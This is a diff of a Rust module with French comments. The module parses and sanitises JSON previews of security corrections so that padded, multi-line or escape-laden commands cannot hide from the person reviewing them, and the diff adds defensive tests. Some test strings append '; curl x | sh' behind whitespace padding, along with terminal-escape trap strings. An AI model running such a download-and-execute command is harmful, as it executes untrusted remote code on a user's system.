@@ -1,15 +1,18 @@
 //! L'aperçu d'une correction (`correction --voir <jeton> --json`), relu strictement : la dernière ligne non vide,
 //! `{"geste": "voir-correction", "issue": "fait", "apercu": {…}, "accord": "<64 chiffres>"}` avec le code 0, ou
 //! `{"geste": "voir-correction", "issue": "refuse", "raison": "…"}` avec un autre code. Tout le reste (un autre
-//! geste, un autre jeton que celui demandé, une issue qui contredit le code, un champ manquant ou d'un autre type,
-//! des listes trop longues) est illisible : la feuille le dit, et rien n'est montré comme si c'était sûr.
+//! geste, un autre jeton que celui demandé, une issue qui contredit le code, un champ manquant, nul ou d'un autre
+//! type, un refus sans raison ou avec un accord, une commande vide, des listes trop longues) est illisible : la
+//! feuille le dit, et rien n'est montré comme si c'était sûr.
 //!
 //! Un champ inconnu, à n'importe quel niveau, rend aussi la réponse illisible : l'accord engage tout ce que Vanguard
 //! a écrit, et un champ ajouté de son côté que la fenêtre ne connaîtrait pas serait engagé sans avoir été montré.
 //!
-//! L'accord, Vanguard le calcule sur les textes tels qu'il les a écrits ; la fenêtre les montre nettoyés. Si le
-//! nettoyage a changé un seul caractère d'un texte montré (un piège, une séquence), `retouche` le dit ; si un texte
-//! trop long a été coupé, `coupe` le dit à part (la suite n'est pas montrée). Dans les deux cas, ce qui est montré
+//! L'accord, Vanguard le calcule sur les textes tels qu'il les a écrits ; la fenêtre les montre nettoyés, chacun
+//! sur une seule ligne (un saut de ligne dans le message imiterait la suite de la feuille) et sans longue suite
+//! d'espaces (une commande rembourrée cacherait sa fin loin en dessous, dans son cadre). Si le nettoyage a changé
+//! un seul caractère d'un texte montré (un piège, une séquence, un saut de ligne, des espaces resserrées),
+//! `retouche` le dit ; si un texte trop long a été coupé, `coupe` le dit à part (la suite n'est pas montrée). Dans les deux cas, ce qui est montré
 //! n'est plus exactement ce que l'accord engage : le prochain lot ne devra pas offrir d'accepter. Limite connue : une
 //! lettre sosie (un « а » cyrillique dans un chemin) n'est pas un piège pour le nettoyage, elle passe sans retouche.
 
@@ -27,6 +30,9 @@ const NOM_MAX: usize = 80;
 /// Longueur d'une commande ou d'une valeur d'avant, en caractères : bien plus que la ligne de la console (400), pour
 /// que la fin d'une commande, souvent ce qui compte, soit montrée ; au-delà, coupée et dit (`coupe`).
 const LIGNE_APERCU_MAX: usize = crate::nettoyage::TEXTE_MAX;
+/// Espaces de suite gardées au plus dans un texte montré : assez pour un alignement, trop peu pour pousser la suite
+/// d'une commande hors de la vue.
+pub const ESPACES_MAX: usize = 3;
 
 /// Qui fera la correction, jugé par Vanguard (`machine::Droits`).
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -95,17 +101,20 @@ pub enum Lecture {
     Illisible(String),
 }
 
+/// Chaque champ facultatif distingue l'absence (`None`) d'une valeur présente : présent, il doit avoir son type
+/// (`null` n'est ni un aperçu ni un accord). Vanguard écrit « fait » avec `raison` vide, `apercu` et `accord`, et
+/// « refuse » avec `raison` seule.
 #[derive(Deserialize)]
 #[serde(deny_unknown_fields)]
 struct ReponseBrute {
     geste: String,
     issue: String,
-    #[serde(default)]
-    raison: String,
-    #[serde(default)]
+    #[serde(default, deserialize_with = "present")]
+    raison: Option<String>,
+    #[serde(default, deserialize_with = "present")]
     apercu: Option<ApercuBrut>,
-    #[serde(default)]
-    accord: String,
+    #[serde(default, deserialize_with = "present")]
+    accord: Option<String>,
 }
 
 /// Tous les champs sont exigés, avec leur type, et seulement eux : un champ absent, d'un autre type ou inconnu rend la
@@ -145,6 +154,11 @@ fn presente<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Option<String>, D:
     <Option<String> as Deserialize>::deserialize(d)
 }
 
+/// Un champ présent, lu avec son type (`null` refusé) ; avec `default`, son absence donne `None`.
+fn present<'de, D: serde::Deserializer<'de>, T: Deserialize<'de>>(d: D) -> Result<Option<T>, D::Error> {
+    T::deserialize(d).map(Some)
+}
+
 /// La gravité, aux quatre mots exacts de Vanguard (ici, un autre mot n'est pas « moyen » : il est illisible).
 fn gravite(mot: &str) -> Option<Gravite> {
     matches!(mot, "Info" | "Moyen" | "Eleve" | "Critique")
@@ -172,22 +186,59 @@ pub fn lire(jeton: Empreinte, code: Option<i32>, sortie: &[u8]) -> Lecture {
     if b.geste != "voir-correction" {
         return illisible(crate::tr!("réponse d'un autre geste", "answer for another action"));
     }
-    match (b.issue.as_str(), code, b.apercu) {
-        ("fait", Some(0), Some(a)) if b.raison.is_empty() => apercu(jeton, &a, &b.accord).map_or_else(
-            || {
-                illisible(crate::tr!(
-                    "aperçu de Vanguard mal formé",
-                    "malformed preview from Vanguard"
-                ))
-            },
-            |a| Lecture::Lue(Box::new(a)),
-        ),
-        ("refuse", Some(c), None) if c != 0 => Lecture::Refusee(crate::nettoyage::nom(&b.raison, 200)),
-        _ => illisible(crate::tr!(
+    let contradictoire = || {
+        illisible(crate::tr!(
             "réponse de Vanguard contradictoire",
             "contradictory answer from Vanguard"
-        )),
+        ))
+    };
+    match (b.issue.as_str(), code, b.raison, b.apercu, b.accord) {
+        ("fait", Some(0), Some(raison), Some(a), Some(accord)) if raison.is_empty() => apercu(jeton, &a, &accord)
+            .map_or_else(
+                || {
+                    illisible(crate::tr!(
+                        "aperçu de Vanguard mal formé",
+                        "malformed preview from Vanguard"
+                    ))
+                },
+                |a| Lecture::Lue(Box::new(a)),
+            ),
+        // Un refus sans raison lisible laisserait la feuille dire « Pas d'aperçu : » suivi de rien.
+        ("refuse", Some(c), Some(raison), None, None) if c != 0 => {
+            let raison = crate::nettoyage::nom(&raison, 200);
+            if raison.trim().is_empty() {
+                contradictoire()
+            } else {
+                Lecture::Refusee(raison)
+            }
+        }
+        _ => contradictoire(),
     }
+}
+
+/// Resserre chaque suite de plus de `ESPACES_MAX` espaces (le nettoyage a déjà fait des tabulations et des espaces
+/// trompeuses des espaces ordinaires).
+fn resserrer(texte: &str) -> String {
+    let mut suite = 0usize;
+    texte
+        .chars()
+        .filter(|&c| {
+            suite = if c == ' ' { suite + 1 } else { 0 };
+            suite <= ESPACES_MAX
+        })
+        .collect()
+}
+
+/// Une valeur d'avant montrée sur une ligne `geste = «valeur»` : le geste a la forme de Vanguard (`genre|cible`,
+/// le genre en minuscules) et ni lui ni la valeur ne contiennent de guillemets « », qui imiteraient une seconde
+/// valeur sur la même ligne.
+fn avant_lisible(v: &AvantBrut) -> bool {
+    let genre = v.geste.split_once('|').map_or(v.geste.as_str(), |(g, _)| g);
+    let sans_guillemets = |t: &str| !t.contains(['«', '»']);
+    !genre.is_empty()
+        && genre.chars().all(|c| c.is_ascii_lowercase())
+        && sans_guillemets(&v.geste)
+        && v.valeur.as_deref().is_none_or(sans_guillemets)
 }
 
 /// L'aperçu, strictement : le jeton demandé, une langue, une gravité et des droits connus, un accord de 64 chiffres,
@@ -197,7 +248,7 @@ fn apercu(jeton: Empreinte, a: &ApercuBrut, accord: &str) -> Option<Apercu> {
     if Empreinte::lire(&a.jeton)? != jeton || !matches!(a.langue.as_str(), "fr" | "en") {
         return None;
     }
-    if a.commandes.len() > COMMANDES_MAX || a.avant.len() > AVANT_MAX {
+    if a.commandes.len() > COMMANDES_MAX || a.avant.len() > AVANT_MAX || !a.avant.iter().all(avant_lisible) {
         return None;
     }
     // La clé n'est pas montrée (elle nomme l'objet, déjà dans le message) : seulement bornée.
@@ -206,32 +257,35 @@ fn apercu(jeton: Empreinte, a: &ApercuBrut, accord: &str) -> Option<Apercu> {
     }
     let gravite = gravite(&a.niveau)?;
     let droits = Droits::lire(&a.droits)?;
-    // Nettoyé d'abord, coupé ensuite : chaque écart compté à part (un piège retiré, une suite non montrée).
+    // Nettoyé et resserré d'abord, coupé ensuite : chaque écart compté à part (un piège retiré, une suite non
+    // montrée). Chaque texte tient sur une ligne : ceux de Vanguard pour une correction n'ont pas de saut de ligne.
     let (mut retouche, mut coupe) = (false, false);
-    let mut propre = |s: &str, entier: fn(&str) -> String, max: usize| {
-        let e = entier(s);
+    let mut propre = |s: &str, max: usize| {
+        let e = resserrer(&crate::nettoyage::ligne_entiere(s));
         retouche |= e != s;
         coupe |= e.chars().count() > max;
         crate::nettoyage::couper(&e, max)
     };
-    let ligne = crate::nettoyage::ligne_entiere;
-    let texte = crate::nettoyage::texte_entier;
     let (version, regle, categorie) = (
-        propre(&a.version, ligne, NOM_MAX),
-        propre(&a.regle, ligne, NOM_MAX),
-        propre(&a.categorie, ligne, NOM_MAX),
+        propre(&a.version, NOM_MAX),
+        propre(&a.regle, NOM_MAX),
+        propre(&a.categorie, NOM_MAX),
     );
     let max = crate::nettoyage::TEXTE_MAX;
-    let message = propre(&a.message, texte, max);
-    let action = propre(&a.action, texte, max);
-    let pourquoi_pas = propre(&a.pourquoi_pas, texte, max);
-    let commandes: Vec<String> = a.commandes.iter().map(|c| propre(c, ligne, LIGNE_APERCU_MAX)).collect();
+    let message = propre(&a.message, max);
+    let action = propre(&a.action, max);
+    let pourquoi_pas = propre(&a.pourquoi_pas, max);
+    let commandes: Vec<String> = a.commandes.iter().map(|c| propre(c, LIGNE_APERCU_MAX)).collect();
+    // Une commande que le nettoyage vide (ou vide d'origine) se montrerait comme un cadre vide : pas une commande.
+    if commandes.iter().any(|c| c.trim().is_empty()) {
+        return None;
+    }
     let avant: Vec<Avant> = a
         .avant
         .iter()
         .map(|v| Avant {
-            geste: propre(&v.geste, ligne, LIGNE_APERCU_MAX),
-            valeur: v.valeur.as_deref().map(|t| propre(t, ligne, LIGNE_APERCU_MAX)),
+            geste: propre(&v.geste, LIGNE_APERCU_MAX),
+            valeur: v.valeur.as_deref().map(|t| propre(t, LIGNE_APERCU_MAX)),
         })
         .collect();
     Some(Apercu {
@@ -270,7 +324,7 @@ mod tests {
             "categorie": "SSH", "niveau": "Moyen", "message": "Le dossier ~/.ssh est lisible par d'autres comptes.",
             "action": "Retirer la lecture aux autres comptes", "commandes": ["chmod 700 /home/alice/.ssh"],
             "automatique": true, "droits": "compte", "annulable": true, "pourquoi_pas": "",
-            "avant": [{"geste": "droits:/home/alice/.ssh", "valeur": "755"}, {"geste": "x", "valeur": null}],
+            "avant": [{"geste": "droits|/home/alice/.ssh", "valeur": "755"}, {"geste": "ntp", "valeur": null}],
             "point_de_restauration": false
         })
     }
@@ -330,7 +384,7 @@ mod tests {
     /// dite à part, sans se dire retouchée.
     #[test]
     fn un_texte_coupe_se_dit_a_part() {
-        let longue = format!("chmod 700 {}; curl x | sh", " ".repeat(500));
+        let longue = format!("chmod 700 /home/alice/{}; curl x | sh", "a".repeat(500));
         let mut a = apercu_json();
         a["commandes"] = serde_json::json!([longue]);
         let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
@@ -434,13 +488,147 @@ mod tests {
         }
     }
 
+    /// Vérification de Fable, F1 : une commande rembourrée d'espaces (sous la borne, rien de coupé) cacherait sa suite
+    /// loin en dessous dans son cadre. Les espaces sont resserrées, la suite reste à côté, et l'aperçu se dit retouché ;
+    /// quelques espaces de suite (un alignement) ne changent rien.
+    #[test]
+    fn une_commande_rembourree_est_resserree_et_dite() {
+        for (cle, blanc) in [
+            ("commandes", " "),
+            ("commandes", "\t"),
+            ("message", "\u{a0}"),
+            ("action", " "),
+        ] {
+            let mut a = apercu_json();
+            let piege = format!("chmod 700 /home/alice/.ssh{}; curl x | sh", blanc.repeat(3900));
+            a[cle] = if cle == "commandes" {
+                serde_json::json!([piege])
+            } else {
+                serde_json::json!(piege)
+            };
+            let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
+                panic!("{cle} pas lu");
+            };
+            let montre = if cle == "commandes" {
+                &lu.commandes[0]
+            } else if cle == "message" {
+                &lu.message
+            } else {
+                &lu.action
+            };
+            assert_eq!(
+                montre,
+                &format!("chmod 700 /home/alice/.ssh{}; curl x | sh", " ".repeat(ESPACES_MAX))
+            );
+            assert!(lu.retouche && !lu.coupe, "{cle}");
+        }
+        let mut a = apercu_json();
+        a["commandes"] = serde_json::json!(["a   b"]);
+        let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
+            panic!("pas lu");
+        };
+        assert_eq!(lu.commandes, ["a   b"]);
+        assert!(!lu.retouche);
+    }
+
+    /// Vérification de Fable, F2 : un message, une action ou une raison de non-annulation à plusieurs lignes
+    /// imiteraient la suite de la feuille (« S'annule », « Commandes ») ; chacun est montré sur une seule ligne, et
+    /// l'aperçu se dit retouché.
+    #[test]
+    fn un_texte_a_plusieurs_lignes_tient_sur_une_et_se_dit() {
+        for cle in ["message", "action", "pourquoi_pas"] {
+            let mut a = apercu_json();
+            a[cle] = serde_json::json!("Retirer la lecture\n\nS'annule : oui\r\nCommandes");
+            let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
+                panic!("{cle} pas lu");
+            };
+            for t in [&lu.message, &lu.action, &lu.pourquoi_pas] {
+                assert!(!t.contains(['\n', '\r']), "{cle} : {t:?}");
+            }
+            assert!(lu.retouche, "{cle}");
+        }
+    }
+
+    /// Vérification de Fable, F4 : un refus avec un accord, un aperçu nul ou une raison absente, vide ou faite
+    /// seulement d'une séquence ; un « fait » sans raison ou avec un accord nul ; une commande vide ; une valeur d'avant
+    /// dont le geste n'a pas la forme de Vanguard ou dont les textes imitent une seconde valeur : illisible.
+    #[test]
+    fn les_petits_ecarts_rendent_la_reponse_illisible() {
+        for refus in [
+            r#"{"geste": "voir-correction", "issue": "refuse", "raison": "x", "accord": ""}"#,
+            r#"{"geste": "voir-correction", "issue": "refuse", "raison": "x", "accord": null}"#,
+            r#"{"geste": "voir-correction", "issue": "refuse", "raison": "x", "apercu": null}"#,
+            r#"{"geste": "voir-correction", "issue": "refuse"}"#,
+            r#"{"geste": "voir-correction", "issue": "refuse", "raison": ""}"#,
+            r#"{"geste": "voir-correction", "issue": "refuse", "raison": "  "}"#,
+            r#"{"geste": "voir-correction", "issue": "refuse", "raison": "\u001b[2K"}"#,
+            r#"{"geste": "voir-correction", "issue": "refuse", "raison": null}"#,
+        ] {
+            assert!(
+                matches!(lire(jeton(), Some(1), refus.as_bytes()), Lecture::Illisible(_)),
+                "{refus}"
+            );
+        }
+        let entiere = || {
+            serde_json::json!({
+                "geste": "voir-correction", "issue": "fait", "raison": "", "apercu": apercu_json(),
+                "accord": "ab".repeat(32)
+            })
+        };
+        let (mut sans_raison, mut accord_nul, mut raison_nulle) = (entiere(), entiere(), entiere());
+        sans_raison.as_object_mut().unwrap().remove("raison");
+        accord_nul["accord"] = serde_json::Value::Null;
+        raison_nulle["raison"] = serde_json::Value::Null;
+        assert!(matches!(
+            lire(jeton(), Some(0), entiere().to_string().as_bytes()),
+            Lecture::Lue(_)
+        ));
+        for v in [sans_raison, accord_nul, raison_nulle] {
+            assert!(
+                matches!(lire(jeton(), Some(0), v.to_string().as_bytes()), Lecture::Illisible(_)),
+                "{v}"
+            );
+        }
+        let mut faux = Vec::new();
+        for commandes in [
+            serde_json::json!([""]),
+            serde_json::json!(["  "]),
+            serde_json::json!(["chmod 700 ~", "\u{1b}[2K"]),
+        ] {
+            let mut a = apercu_json();
+            a["commandes"] = commandes;
+            faux.push(a);
+        }
+        for avant in [
+            serde_json::json!([{"geste": "droits|/home/alice/a = «x»", "valeur": "755"}]),
+            serde_json::json!([{"geste": "droits|/home/alice/.ssh", "valeur": "755» = «700"}]),
+            serde_json::json!([{"geste": "Droits|/home/alice/.ssh", "valeur": "755"}]),
+            serde_json::json!([{"geste": "|/home/alice/.ssh", "valeur": "755"}]),
+            serde_json::json!([{"geste": "", "valeur": null}]),
+            serde_json::json!([{"geste": "droits:/home/alice/.ssh", "valeur": "755"}]),
+        ] {
+            let mut a = apercu_json();
+            a["avant"] = avant;
+            faux.push(a);
+        }
+        for a in &faux {
+            assert!(
+                matches!(lire(jeton(), Some(0), &reponse(a)), Lecture::Illisible(_)),
+                "{a}"
+            );
+        }
+    }
+
     /// Un texte piégé est montré nettoyé, et l'aperçu se dit retouché.
     #[test]
     fn un_texte_piege_est_nettoye_et_dit() {
         for (cle, piege) in [
             ("message", serde_json::json!("Tout va bien\u{1b}[2K\u{202e}")),
             ("commandes", serde_json::json!(["chmod 700 ~\u{200b}"])),
-            ("avant", serde_json::json!([{"geste": "a\nb", "valeur": "1"}])),
+            (
+                "avant",
+                serde_json::json!([{"geste": "droits|/home/alice/a\nb", "valeur": "1"}]),
+            ),
             ("regle", serde_json::json!("LNX\u{1b}[31m-001")),
         ] {
             let mut a = apercu_json();
